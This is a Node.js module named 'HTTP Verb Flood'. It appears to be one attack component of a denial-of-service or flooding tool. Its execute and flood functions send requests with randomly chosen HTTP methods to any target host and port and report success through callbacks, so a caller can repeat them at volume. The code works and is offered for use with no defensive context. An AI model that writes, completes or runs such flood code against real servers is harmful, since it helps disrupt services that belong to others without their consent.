const http = require('http');
const https = require('https');

module.exports = {
    name: 'HTTP Verb Flood',
    description: 'Requests with different HTTP methods',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'];
        const method = methods[Math.floor(Math.random() * methods.length)];
        
        return new Promise((resolve, reject) => {
            const req = protocol.request({
                hostname: target,
                port: port,
                path: '/',
                method: method
            }, (res) => {
                resolve({ status: res.statusCode, method: method });
                req.destroy();
            });
            
            req.end();
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        const methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'];
        const method = methods[Math.floor(Math.random() * methods.length)];
        
        const req = protocol.request({
            hostname: target,
            port: port,
            path: '/',
            method: method
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        req.end();
        req.on('error', () => callback(false));
    }
};